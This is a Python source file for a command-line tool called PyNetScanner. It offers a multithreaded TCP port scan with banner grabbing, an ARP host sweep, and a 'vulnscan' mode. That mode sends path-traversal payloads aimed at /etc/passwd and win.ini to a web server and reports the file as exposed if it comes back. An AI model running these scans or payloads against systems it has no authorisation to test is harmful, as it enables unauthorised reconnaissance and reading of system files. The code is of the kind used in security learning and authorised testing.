import argparse
import sys
import threading
import socket
import ipaddress
from typing import List, Optional, Tuple, Any

# Conditional imports for Scapy: We only need these for the discovery mode.
# We wrap them in try/except to prevent the program from crashing if Scapy isn't installed
# or if it hits a permission error right away.
try:
    from scapy.all import srp, Ether, ARP, conf, get_if_list, get_if_addr, get_if_hwaddr

    # Disable verbose output from scapy
    conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
except Exception:
    # Handle cases where Scapy is installed but cannot load drivers (e.g., Npcap issues)
    SCAPY_AVAILABLE = False


# ==============================================================================
# 1. HELPER FUNCTIONS
# ==============================================================================

def parse_ports(port_input: str) -> List[int]:
    """Converts the input string (e.g., '80,443' or '1-10') into a list of integers."""
    ports = set()

    # Handle comma-separated list (e.g., "22,80,443")
    if ',' in port_input:
        for p in port_input.split(','):
            try:
                ports.add(int(p.strip()))
            except ValueError:
                pass

                # Handle range (e.g., "1-1024")
    elif '-' in port_input:
        try:
            start, end = map(int, port_input.split('-'))
            # Ensure start <= end and ports are valid (1-65535)
            if 1 <= start <= end <= 65535:
                ports.update(range(start, end + 1))
        except ValueError:
            pass

            # Handle single port
    else:
        try:
            p = int(port_input.strip())
            if 1 <= p <= 65535:
                ports.add(p)
        except ValueError:
            pass

    return sorted(list(ports))


def banner_cleaner(banner: bytes) -> str:
    """Cleans up raw bytes from a service banner into a readable string."""
    try:
        # Decode the bytes using UTF-8, replacing errors with a placeholder
        text = banner.decode('utf-8', errors='replace').strip()
        # Remove common control characters (like newlines and carriage returns)
        return text.replace('\r', '').replace('\n', ' | ')
    except:
        return "[Non-Textual Data]"


# Scapy-specific helper function for interface discovery
def find_default_interface(target_ip: str) -> Optional[str]:
    """Tries to find the most suitable interface based on the target IP's network."""
    if not SCAPY_AVAILABLE:
        return None
    try:
        # Use a /24 subnet mask to compare networks
        target_net = ipaddress.ip_network(f"{target_ip}/24", strict=False)

        for iface_name in get_if_list():
            try:
                iface_ip = get_if_addr(iface_name)
                if iface_ip and iface_ip != '127.0.0.1':
                    iface_net = ipaddress.ip_network(f"{iface_ip}/24", strict=False)
                    if iface_net == target_net:
                        return iface_name
            except:
                continue
        return None
    except:
        return None  # If IP address parsing fails


# ==============================================================================
# 2. SCAN MODE LOGIC (Port Scanner)
# ==============================================================================

# Global list to store open ports and their banners
OPEN_PORTS_DATA: List[Tuple[int, str]] = []
# Global lock for safely updating the shared list (crucial for multithreading)
DATA_LOCK = threading.Lock()


def scan_port(ip: str, port: int, semaphore: threading.BoundedSemaphore):
    """Attempts to connect to a specific port, grabs the banner, and updates the shared list."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Set a 1-second timeout for quick scanning
    s.settimeout(1.0)
    banner_info = "[No Banner Received]"

    try:
        s.connect((ip, port))

        # Try to receive a banner after connection
        try:
            # Send a basic HTTP GET request for maximum compatibility
            # (though many non-HTTP services will just ignore it)
            s.sendall(b"GET / HTTP/1.1\r\n\r\n")
            banner = s.recv(1024)
            banner_info = banner_cleaner(banner)
        except socket.timeout:
            banner_info = "[Connection accepted, but timed out waiting for banner]"
        except Exception:
            banner_info = "[Connection accepted, but error receiving data]"

        # Update shared list safely
        with DATA_LOCK:
            OPEN_PORTS_DATA.append((port, banner_info))
            print(f"[+] Port {port:<5} is OPEN | Service: {banner_info}")

    except socket.error:
        # Connection refused, timeout, or network error
        pass
    finally:
        s.close()
        # Release the semaphore so another thread can start
        semaphore.release()


def run_scanner(args: argparse.Namespace):
    """Main function to orchestrate the multithreaded port scan."""
    global OPEN_PORTS_DATA
    OPEN_PORTS_DATA = []  # Reset for each scan

    target_ip = args.target
    ports_to_scan = parse_ports(args.ports)
    max_threads = args.concurrency

    if not ports_to_scan:
        print("[-] Error: No valid ports specified. Exiting.")
        return

    # 1. Setup Threading Limits
    threads: List[threading.Thread] = []
    semaphore = threading.BoundedSemaphore(value=max_threads)

    print(f"\n[*] Starting Port Scan on target: {target_ip} with {len(ports_to_scan)} ports.")
    print(f"[*] Concurrency limit: {max_threads} threads.")
    print("--------------------------------------------------")

    # 2. Start Scanning Threads
    for port in ports_to_scan:
        # Acquire the semaphore (waits if max_threads are already running)
        semaphore.acquire()

        # Create a thread and pass all necessary arguments
        t = threading.Thread(target=scan_port, args=(target_ip, port, semaphore))
        threads.append(t)
        t.start()

    # 3. Wait for All Threads
    # Wait for all threads to finish before exiting the script
    for t in threads:
        t.join()

    print("--------------------------------------------------")

    # 4. Final Summary
    if OPEN_PORTS_DATA:
        # Sort data by port number before printing summary
        OPEN_PORTS_DATA.sort(key=lambda x: x[0])
        print(f"[!] Scan completed successfully. Total {len(OPEN_PORTS_DATA)} port(s) found open.")
        print("\n  -- SUMMARY OF OPEN PORTS --")
        for port, banner in OPEN_PORTS_DATA:
            print(f"  [+] Port {port:<5} | Service: {banner}")
    else:
        print("[!] Scan completed. No open ports found in the specified range.")


# ==============================================================================
# 3. DISCOVER MODE LOGIC (Host Discovery)
# ==============================================================================

def run_discoverer(args: argparse.Namespace):
    """Main function to orchestrate the Host Discovery sweep."""
    if not SCAPY_AVAILABLE:
        print("\n[!!!] Scapy/Npcap is not fully functional.")
        print("[*] Please ensure you have installed Npcap and are running this script with Administrator privileges.")
        return

    ip_range = args.range
    interface = args.interface

    ip_list = []
    try:
        # Using ipaddress module to ensure the range is valid
        ip_list = [str(ip) for ip in ipaddress.ip_network(ip_range, strict=False).hosts()]
    except ValueError as e:
        print(f"[-] Error: Invalid IP address or CIDR range specified: {e}", file=sys.stderr)
        return

    if not ip_list:
        print("[-] Error: Invalid IP range or subnet size is too small. Exiting.")
        return

    print(f"\n[*] Starting Host Discovery on {ip_range} ({len(ip_list)} potential hosts)...")

    # Determine the interface to use
    if not interface:
        # Auto-detect based on the first IP in the list
        interface = find_default_interface(ip_list[0])
        if interface:
            print(f"[*] Auto-detected interface: {interface}")
        else:
            print("[*] Could not auto-detect the optimal interface. Using Scapy's default.")

    else:
        print(f"[*] Using user-specified interface: {interface}")

    print("--------------------------------------------------")

    live_hosts: List[Tuple[str, str]] = []

    # --- ARP SCAN (Local Network Only) ---
    print("[*] Performing fast ARP scan (for local networks)...")

    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)

    try:
        # NOTE: Removed the 'filter' argument that caused the error.
        answered, unanswered = srp(arp_request, timeout=2, iface=interface)

        for sent, received in answered:
            ip = received.psrc
            mac = received.hwsrc
            live_hosts.append((ip, mac))

    except PermissionError:
        print("\n[!!!] ERROR: Scapy requires elevated privileges (root/Administrator) to send raw packets.")
        print("[*] Please ensure PyCharm or the terminal is run with 'Run as Administrator'.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!!!] CRITICAL ERROR during packet send/receive. Check Npcap installation and driver status.")
        print(f"      Error detail: {e}", file=sys.stderr)
        sys.exit(1)

    print("--------------------------------------------------")

    if live_hosts:
        print(f"[!] Total {len(live_hosts)} live host(s) found.")
        print("\n  -- LIVE HOSTS SUMMARY --")
        # Sort by IP address before displaying
        for ip, mac in sorted(live_hosts, key=lambda x: ipaddress.ip_address(x[0])):
            print(f"  [+] IP: {ip:<15} | MAC: {mac}")
    else:
        print("[!] Scan completed. No live hosts found in the specified range.")


# ==============================================================================
# 4. VULNERABILITY SCAN MODE LOGIC (Path Traversal)
# ==============================================================================

def check_path_traversal(ip: str, port: int, payload: str) -> Optional[str]:
    """
    Attempts a basic Path Traversal attack by requesting a common system file
    (e.g., /etc/passwd) using the payload.
    Returns a success message if the vulnerability is detected, otherwise None.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)  # Longer timeout for a full HTTP request
        s.connect((ip, port))

        # Construct the HTTP request with the payload
        request = (
            f"GET {payload} HTTP/1.1\r\n"
            f"Host: {ip}:{port}\r\n"
            "Connection: close\r\n\r\n"
        )

        s.sendall(request.encode('utf-8'))

        # Receive the response header and a bit of the body
        response = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
            # Stop reading if we have a reasonable amount of data (e.g., 4KB)
            if len(response) > 4096:
                break

        s.close()

        response_text = response.decode('utf-8', errors='ignore').lower()

        # Check for common indicators of successful Path Traversal
        # 1. Presence of "root:" (Linux /etc/passwd signature)
        # 2. Presence of "windows/system32" or "win.ini" (Windows signature - though less reliable)
        # 3. A 200 OK status code along with the signature

        if "http/1.1 200 ok" in response_text and "root:" in response_text:
            return f"VULNERABLE: Linux Path Traversal via payload: {payload}. Found 'root:' signature."

        if "http/1.1 200 ok" in response_text and ("windows" in response_text and "system32" in response_text):
            return f"POTENTIAL VULNERABILITY: Windows Path Traversal via payload: {payload}."

        return None

    except socket.error:
        # Connection issues, port closed, or server reset
        return None
    except Exception:
        # General error during request
        return None


def run_vuln_scanner(args: argparse.Namespace):
    """Main function to orchestrate the vulnerability scan."""
    target_ip = args.target
    target_port = args.port

    print(f"\n[*] Starting Vulnerability Scan on: {target_ip}:{target_port}")
    print("--------------------------------------------------")

    # Define common Path Traversal payloads (for Linux and Windows)
    # The vulnerability scanner is simplified to check a few common cases
    payloads = [
        # Linux /etc/passwd common payloads
        "/../../../../../../etc/passwd",
        "/..././..././etc/passwd",
        # Windows system file attempt (often unreliable, but good for testing)
        "/../../../../../../windows/win.ini",
    ]

    vulnerabilities_found = []

    for payload in payloads:
        print(f"[*] Testing payload: {payload:<40}...", end='', flush=True)
        result = check_path_traversal(target_ip, target_port, payload)

        if result:
            vulnerabilities_found.append(result)
            print("FOUND!")
            print(f"  [!!!] {result}")
        else:
            print("Not Found.")

    print("--------------------------------------------------")

    if vulnerabilities_found:
        print(f"[!] Scan completed. {len(vulnerabilities_found)} potential vulnerabilities found.")
        print("\n  -- VULNERABILITY SUMMARY --")
        for vuln in vulnerabilities_found:
            print(f"  [!!!] {vuln}")
    else:
        print("[!] Scan completed. No simple path traversal vulnerabilities detected.")


# ==============================================================================
# 5. MAIN ARGUMENT PARSING AND ENTRY POINT
# ==============================================================================

if __name__ == '__main__':
    try:
        # Create the top-level parser
        parser = argparse.ArgumentParser(
            prog="PyNetScanner",
            description="A unified multithreaded tool for network scanning, host discovery, and basic vulnerability testing.",
            formatter_class=argparse.RawTextHelpFormatter
        )

        # Create subparsers to handle the different modes (scan, discover, vulnscan)
        subparsers = parser.add_subparsers(
            dest="mode",
            required=True,
            help="Select the mode of operation (scan, discover, or vulnscan)."
        )

        # --- SCAN MODE PARSER ---
        scan_parser = subparsers.add_parser(
            "scan",
            help="Run a multithreaded TCP port scan with banner grabbing.",
            formatter_class=argparse.RawTextHelpFormatter
        )
        scan_parser.add_argument("-t", "--target", dest="target", required=True,
                                 help="Target IP address or hostname to scan.")
        scan_parser.add_argument("-p", "--ports", dest="ports", required=True,
                                 help="Ports to scan (e.g., 80,443 or 1-1024).")
        scan_parser.add_argument("-c", "--concurrency", dest="concurrency", type=int, default=20,
                                 help="Number of threads to use for scanning (default: 20).")
        scan_parser.set_defaults(func=run_scanner)

        # --- DISCOVER MODE PARSER ---
        discover_parser = subparsers.add_parser(
            "discover",
            help="Run a host discovery (ARP sweep) on a local network range.",
            formatter_class=argparse.RawTextHelpFormatter
        )
        discover_parser.add_argument("-r", "--range", dest="range", required=True,
                                     help="IP range in CIDR notation (e.g., 192.168.100.0/24).")
        discover_parser.add_argument("-i", "--interface", dest="interface", required=False,
                                     help="Network interface name (e.g., 'Wi-Fi' or internal NPF name).")
        discover_parser.set_defaults(func=run_discoverer)

        # --- VULNSCAN MODE PARSER ---
        vulnscan_parser = subparsers.add_parser(
            "vulnscan",
            help="Run a basic path traversal vulnerability test on a web server.",
            formatter_class=argparse.RawTextHelpFormatter
        )
        vulnscan_parser.add_argument("-t", "--target", dest="target", required=True,
                                     help="Target IP address or hostname to scan.")
        vulnscan_parser.add_argument("-p", "--port", dest="port", type=int, default=80,
                                     help="Target port (default: 80).")
        vulnscan_parser.set_defaults(func=run_vuln_scanner)

        # Parse and execute
        args = parser.parse_args()
        args.func(args)

    except KeyboardInterrupt:
        print("\n[*] PyNetScanner interrupted by user (Ctrl+C). Exiting.")
        sys.exit(0)
    except Exception as e:
        # General catch for any unforeseen issues
        if args.mode == "discover" and SCAPY_AVAILABLE:
            # Scapy errors are often permission-related but might not raise PermissionError directly
            print("\n[!] Check for Npcap and Administrator privileges if this error persists.")
        print(f"\n[-] A critical error occurred: {e}", file=sys.stderr)
        sys.exit(1)